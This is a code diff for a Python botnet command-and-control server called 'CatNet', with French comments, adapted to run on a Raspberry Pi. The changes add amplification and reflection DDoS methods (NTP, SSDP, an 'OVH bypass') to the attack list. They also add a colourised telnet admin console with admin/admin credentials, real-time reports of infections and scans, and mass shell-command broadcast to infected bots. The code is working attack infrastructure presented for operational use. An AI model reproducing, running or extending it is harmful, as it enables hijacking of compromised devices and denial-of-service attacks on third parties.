@@ -10,20 +10,39 @@ import random
 import string
 from datetime import datetime
 
-# Configuration
+import gc
+
+# Configuration ultra-légère pour Raspberry Pi (WiFi)
 HOST = '0.0.0.0'
 PORT = 1337
 HTTP_PORT = 80
-ADMIN_PORT = 2323 # Port pour connexion PuTTY/Telnet
-MAX_CONNECTIONS = 900
+ADMIN_PORT = 2323
+MAX_CONNECTIONS = 200 # Réduit encore pour éviter la saturation WiFi
+LOG_TO_FILE = False
 BINARIES_DIR = os.path.dirname(os.path.abspath(__file__))
+
+# Couleurs ANSI pour l'interface
+class Colors:
+    RED = '\033[91m'
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    BLUE = '\033[94m'
+    MAGENTA = '\033[95m'
+    CYAN = '\033[96m'
+    WHITE = '\033[97m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+    END = '\033[0m'
+    CLEAR = '\033[2J\033[H'
 
 DDOS_METHODS = {
     "syn": "Flood SYN", "ack": "Flood ACK", "udp": "Flood UDP",
     "tcp": "Flood TCP", "icmp": "Flood ICMP", "http": "Flood HTTP",
     "slowloris": "Slowloris", "rudy": "RUDY", "arme": "ARME",
     "hulk": "HULK", "mix": "Mix", "bypass": "Bypass",
-    "dns": "DNS Amplification", "vse": "Valve Source Engine"
+    "dns": "DNS Amplification", "vse": "Valve Source Engine",
+    "ntp": "NTP Reflection", "ssdp": "SSDP Amplification",
+    "ovh": "OVH Bypass", "std": "STD UDP Flood"
 }
 
 class BotnetC2:
@@ -34,10 +53,21 @@ class BotnetC2:
         self.total_commands = 0
         self.active_ddos = 0
         self.running = True
+        self.show_scans = False # Basculer l'affichage des scans
+        self.admin_sockets = [] # Liste des administrateurs connectés
 
     def log(self, message, level="INFO"):
         timestamp = datetime.now().strftime("%H:%M:%S")
         print(f"[{timestamp}] [{level}] {message}")
+
+    def broadcast_to_admins(self, message):
+        """Envoie un message à tous les administrateurs connectés via PuTTY."""
+        with self.lock:
+            for sock in self.admin_sockets[:]:
+                try:
+                    sock.send(message.replace("\n", "\r\n").encode())
+                except:
+                    self.admin_sockets.remove(sock)
 
     def handle_bot(self, client_socket, address):
         bot_info = {
@@ -70,31 +100,41 @@ class BotnetC2:
                             break
                 
                 with self.lock:
-                    # Limiter le nombre total de bots en mémoire si nécessaire
-                    if len(self.connected_bots) < 10000:
+                    # Nettoyage agressif de la RAM (Garbage Collector) pour la Pi
+                    if len(self.connected_bots) % 100 == 0:
+                        gc.collect()
+                        
+                    if len(self.connected_bots) < MAX_CONNECTIONS:
                         self.connected_bots.append(bot_info)
                     else:
                         client_socket.close()
                         return
 
-                # Réduire le verbiage des logs
+                # Réduire le verbiage des logs, mais notifier les admins si nécessaire
                 # self.log(f"Nouveau bot: {address[0]} (ID: {bot_info['device_id']})")
                 client_socket.send("PING".encode('utf-8'))
 
             while self.running:
                 try:
-                    # Attendre les données avec un timeout long pour le keep-alive
-                    client_socket.settimeout(120)
+                    # Timeout très long (5 min) pour minimiser les échanges keep-alive
+                    client_socket.settimeout(300)
                     data = client_socket.recv(1024).decode('utf-8', errors='ignore')
                     if not data: break
                     
                     if data.startswith("SCAN_RESULT|"):
-                        # Ne plus logger chaque résultat de scan pour économiser le CPU/Disque
-                        pass
+                        # Afficher les scans en temps réel si l'option est activée
+                        if self.show_scans:
+                            msg = f"{Colors.YELLOW}[SCAN] {address[0]} -> {data.split('|')[1]}{Colors.END}\n"
+                            self.broadcast_to_admins(msg)
                     elif data.startswith("DDOS_STARTED|"):
                         with self.lock: self.active_ddos += 1
+                        if self.show_scans:
+                            msg = f"{Colors.GREEN}[DDOS] {address[0]} a commencé l'attaque sur {data.split('|')[1]}{Colors.END}\n"
+                            self.broadcast_to_admins(msg)
                     elif data.startswith("VERIFY_INFECTION|"):
-                        pass
+                        if self.show_scans:
+                            msg = f"{Colors.CYAN}[INFECTION] {address[0]} confirmée!{Colors.END}\n"
+                            self.broadcast_to_admins(msg)
                     elif data == "PONG":
                         pass
                 except socket.timeout:
@@ -131,28 +171,77 @@ class BotnetC2:
             except EOFError:
                 break
 
+    def get_banner(self):
+        banner = f"""{Colors.CYAN}
+   ▄████████    ▄████████     ███        ▄██████▄   ▄██████▄  
+  ███    ███   ███    ███ ▀█████████▄   ███    ███ ███    ███ 
+  ███    █▀    ███    ███    ▀███▀▀██   ███    ███ ███    ███ 
+  ███          ███    ███     ███   ▀   ███    ███ ███    ███ 
+  ███        ▀███████████     ███       ███    ███ ███    ███ 
+  ███    █▄    ███    ███     ███       ███    ███ ███    ███ 
+  ███    ███   ███    ███     ███       ███    ███ ███    ███ 
+  ▀████████    ███    █▀     ▄████▀      ▀██████▀   ▀██████▀  
+{Colors.MAGENTA}          >> CATNET BOTNET C2 INTERFACE v3.1 <<{Colors.END}
+        """
+        return banner
+
     def process_command(self, cmd, out):
-        action = cmd[0]
+        action = cmd[0].lower()
         if action == "list":
             with self.lock:
-                out.write(f"{'ID':<5} | {'IP':<15} | {'Hostname':<20} | {'Arch':<10}\n")
-                out.write("-" * 60 + "\n")
+                out.write(f"\r\n{Colors.BOLD}{'ID':<5} | {'IP':<15} | {'Hostname':<20} | {'Arch':<10}{Colors.END}\n")
+                out.write(f"{Colors.BLUE}" + "-" * 60 + f"{Colors.END}\n")
                 for i, b in enumerate(self.connected_bots):
                     out.write(f"{i:<5} | {b['ip']:<15} | {b['hostname']:<20} | {b['arch']:<10}\n")
         elif action == "broadcast" and len(cmd) > 1:
             n = self.broadcast("EXEC " + " ".join(cmd[1:]))
-            out.write(f"Envoyé à {n} bots\n")
+            out.write(f"{Colors.GREEN}[+] Commande envoyée à {n} bots.{Colors.END}\n")
         elif action == "ddos-all" and len(cmd) > 2:
             target = cmd[1]
             duration = cmd[2]
-            method = cmd[3] if len(cmd) > 3 else 'mix'
+            method = cmd[3].lower() if len(cmd) > 3 else 'mix'
             port = cmd[4] if len(cmd) > 4 else '80'
+            
+            if method not in DDOS_METHODS and method != "mix":
+                out.write(f"{Colors.RED}[!] Méthode inconnue. Tapez 'methods' pour la liste.{Colors.END}\n")
+                return
+
+            # Petite animation de lancement
+            out.write(f"{Colors.YELLOW}[*] Préparation de l'attaque {method} sur {target}...")
+            if hasattr(out, 'flush'): out.flush()
+            time.sleep(0.5)
+            out.write(f"\r{Colors.GREEN}[+] Attaque {method} lancée sur {target}:{port} ({duration}s){Colors.END}\n")
+            
             n = self.broadcast(f"DDOS {target} {port} {duration} {method}")
-            out.write(f"Attaque {method} lancée sur {target}:{port} pendant {duration}s avec {n} bots\n")
+            out.write(f"{Colors.CYAN}[*] {n} bots ont reçu l'ordre d'attaque.{Colors.END}\n")
+            
+        elif action == "methods":
+            out.write(f"\r\n{Colors.BOLD}Méthodes DDoS disponibles :{Colors.END}\n")
+            for m, desc in DDOS_METHODS.items():
+                out.write(f" - {Colors.YELLOW}{m:<10}{Colors.END} : {desc}\n")
+        elif action == "scans":
+            self.show_scans = not self.show_scans
+            status = f"{Colors.GREEN}ACTIVÉ{Colors.END}" if self.show_scans else f"{Colors.RED}DÉSACTIVÉ{Colors.END}"
+            out.write(f"[*] Affichage des scans en temps réel : {status}\n")
         elif action == "status":
-            out.write(f"Infections: {self.total_infections} | DDoS: {self.active_ddos}\n")
+            with self.lock:
+                out.write(f"\r\n{Colors.BOLD}Statistiques CatNet :{Colors.END}\n")
+                out.write(f" - Bots en ligne    : {Colors.GREEN}{len(self.connected_bots)}{Colors.END}\n")
+                out.write(f" - Total infections : {Colors.CYAN}{self.total_infections}{Colors.END}\n")
+                out.write(f" - Attaques actives : {Colors.RED}{self.active_ddos}{Colors.END}\n")
         elif action == "help":
-            out.write("Commandes: list, broadcast <cmd>, ddos-all <target> <duration> <method> [port], status, exit\n")
+            out.write(f"\r\n{Colors.BOLD}Commandes disponibles :{Colors.END}\n")
+            out.write(f" - {Colors.YELLOW}list{Colors.END}             : Affiche les bots connectés\n")
+            out.write(f" - {Colors.YELLOW}broadcast <cmd>{Colors.END}  : Exécute une commande shell\n")
+            out.write(f" - {Colors.YELLOW}ddos-all <t> <d> <m>{Colors.END}: Lance une attaque DDoS\n")
+            out.write(f" - {Colors.YELLOW}methods{Colors.END}          : Liste les types d'attaques\n")
+            out.write(f" - {Colors.YELLOW}scans{Colors.END}            : Active/Désactive le monitoring des scans\n")
+            out.write(f" - {Colors.YELLOW}status{Colors.END}           : Affiche les stats globales\n")
+            out.write(f" - {Colors.YELLOW}clear{Colors.END}            : Efface l'écran\n")
+            out.write(f" - {Colors.YELLOW}logout/exit{Colors.END}      : Quitter l'interface\n")
+        elif action == "clear":
+            out.write(Colors.CLEAR)
+            out.write(self.get_banner())
         elif action == "exit":
             self.running = False
             sys.exit(0)
@@ -209,34 +298,32 @@ class BotnetC2:
     def handle_admin(self, admin_socket, address):
         try:
             # Forcer le mode caractère et désactiver l'écho local du client
-            # Pour que le serveur gère lui-même l'affichage
-            # IAC WILL ECHO (255 251 1), IAC WILL SUPPRESS GO AHEAD (255 251 3)
             admin_socket.send(bytes([255, 251, 1, 255, 251, 3]))
+            
+            admin_socket.send(Colors.CLEAR.encode())
+            admin_socket.send(self.get_banner().replace("\n", "\r\n").encode())
             
             admin_socket.send(b"\r\nCatNet Admin Login: ")
             login = self.read_line(admin_socket, echo=True)
             if login is None: return
             
             admin_socket.send(b"Password: ")
-            # Ne pas afficher le mot de passe (écho=False)
             password = self.read_line(admin_socket, echo=False)
             if password is None: return
             
-            # Log de débogage interne
-            self.log(f"Tentative login admin: '{login}' depuis {address[0]}")
-            
             if login.lower() == "admin" and password == "admin":
-                admin_socket.send(b"\r\nWelcome to CatNet C2 Admin Interface\r\n")
-                admin_socket.send(b"Type 'help' for commands or 'logout' to exit.\r\n")
+                with self.lock:
+                    self.admin_sockets.append(admin_socket)
+                
+                admin_socket.send(f"\r\n{Colors.GREEN}[+] Accès autorisé.{Colors.END}\r\n".encode())
+                admin_socket.send(b"Tapez 'help' for commands.\r\n")
                 
                 while self.running:
-                    admin_socket.send(f"\r\n[Bots: {len(self.connected_bots)}] admin> ".encode())
+                    prompt = f"\r\n{Colors.BOLD}[{Colors.CYAN}CatNet{Colors.WHITE}@{Colors.MAGENTA}{len(self.connected_bots)}{Colors.END}{Colors.BOLD}]{Colors.END} > "
+                    admin_socket.send(prompt.encode())
                     data = self.read_line(admin_socket, echo=True)
                     if not data: break
                     if data.lower() == "logout": break
-                    if data.lower() == "exit": 
-                        self.running = False
-                        sys.exit(0)
                     
                     cmd = data.split()
                     if not cmd: continue
@@ -246,11 +333,13 @@ class BotnetC2:
                     self.process_command(cmd, output)
                     admin_socket.send(output.getvalue().replace("\n", "\r\n").encode())
             else:
-                self.log(f"Login échoué pour {address[0]} (Login: {login})", "WARN")
-                admin_socket.send(b"\r\nLogin failed. Session closed.\r\n")
+                admin_socket.send(f"\r\n{Colors.RED}[!] Échec de l'authentification.{Colors.END}\r\n".encode())
         except Exception as e:
-            self.log(f"Erreur session admin {address[0]}: {e}", "ERROR")
+            pass
         finally:
+            with self.lock:
+                if admin_socket in self.admin_sockets:
+                    self.admin_sockets.remove(admin_socket)
             admin_socket.close()
 
     def admin_listener(self):
